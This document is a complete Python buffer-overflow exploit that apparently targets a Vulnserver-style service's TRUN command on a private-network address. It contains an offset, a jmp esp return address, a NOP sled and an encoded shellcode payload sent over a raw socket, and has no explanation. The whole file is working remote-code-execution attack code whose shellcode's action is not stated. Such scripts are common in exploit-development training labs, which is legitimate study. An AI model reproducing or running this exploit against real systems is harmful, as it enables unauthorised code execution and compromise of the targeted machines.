#!/usr/bin/env python3
import struct,socket

s = socket.socket()
s.connect( ('192.168.1.2',9999) )

buffer=2984
offset=2003
new_eip = struct.pack("<I",0x62501203) # jmp esp
nop_sled = b"\x90"*16

buf =  b""
buf += b"\xbb\xeb\x92\xdd\x7e\xd9\xe5\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x59\x31\x5a\x14\x03\x5a\x14\x83\xea"
buf += b"\xfc\x09\x67\x21\x96\x42\x88\xda\x67\x3c\xb8\x08"
buf += b"\x03\x37\xe8\x9c\x47\x15\x01\x56\x05\x8d\x90\x8d"
buf += b"\x21\xdf\x8a\x7c\xc9\x10\x7c\x34\x13\x1f\x42\x65"
buf += b"\x67\x3e\x3e\x74\xb4\xe0\x7f\xb7\xc9\xe1\xb8\x01"
buf += b"\xa7\x0e\x14\x19\x15\xc0\xce\x96\xd8\xdc\xf1\x78"
buf += b"\x57\x5c\x8a\xfd\xa8\x28\x26\xff\xf8\x5b\xee\xdf"
buf += b"\xf9\x88\x5f\xab\xb2\x36\xe5\x62\x36\x7a\xac\x45"
buf += b"\x48\x09\x1a\x2d\xb7\xdb\x52\xf1\x14\x22\x5b\xfc"
buf += b"\x65\x63\x5c\x1f\x10\x9f\x9e\xa2\x23\x64\xdc\x78"
buf += b"\xa1\x7a\x46\x0a\x11\x5e\x76\xdf\xc4\x15\x74\x94"
buf += b"\x83\x71\x99\x2b\x47\x0a\xa5\xa0\x66\xdc\x2f\xf2"
buf += b"\x4c\xf8\x74\xa0\xed\x59\xd1\x07\x11\xb9\xbd\xf8"
buf += b"\xb7\xb2\x2c\xee\xc8\x3b\xaf\x0f\x95\xab\x63\xc2"
buf += b"\x26\x2b\xec\x55\x54\x19\xb3\xcd\xf2\x11\x3c\xc8"
buf += b"\x05\x20\x2a\xeb\xda\x8a\x3b\x15\xdb\xea\x12\xd2"
buf += b"\x8f\xba\x0c\xf3\xaf\x51\xcd\xfc\x65\xcf\xc7\x6a"
buf += b"\x46\xa7\xd9\x74\x2e\xb5\xd9\x99\xf2\x30\x3f\xc9"
buf += b"\x5a\x12\x90\xaa\x0a\xd2\x40\x43\x41\xdd\xbf\x73"
buf += b"\x6a\x34\xa8\x1e\x85\xe0\x80\xb6\x3c\xa9\x5b\x26"
buf += b"\xc0\x64\x26\x68\x4a\x8c\xd6\x27\xbb\xe5\xc4\x50"
buf += b"\xdc\x05\x15\xa1\x49\x05\x7f\xa5\xdb\x52\x17\xa7"
buf += b"\x3a\x94\xb8\x58\x69\xa7\xbf\xa7\xec\x91\xb4\x9e"
buf += b"\x7a\x9d\xa2\xde\x6a\x1d\x33\x89\xe0\x1d\x5b\x6d"
buf += b"\x51\x4e\x7e\x72\x4c\xe3\xd3\xe7\x6f\x55\x87\xa0"
buf += b"\x07\x5b\xfe\x87\x87\xa4\xd5\x9b\xc0\x5a\xab\xb3"
buf += b"\x68\x32\x53\x84\x88\xc2\x39\x04\xd9\xaa\xb6\x2b"
buf += b"\xd6\x1a\x36\xe6\xbf\x32\xbd\x67\x0d\xa3\xc2\xad"
buf += b"\xd3\x7d\xc2\x42\xc8\x8e\xb9\x2b\xef\x6f\x3e\x22"
buf += b"\x94\x70\x3e\x4a\xaa\x4d\xe8\x73\xd8\x90\x28\xc0"
buf += b"\xd3\xa7\x0d\x61\x7e\xc7\x02\x71\xab"

payload = [

    b'TRUN /.:/',
    b'A'*offset,
    new_eip,
    nop_sled,
    buf,
    b'C'*(buffer - offset - len(nop_sled) - len(buf))

]
payload = b"".join(payload)

s.send(payload)
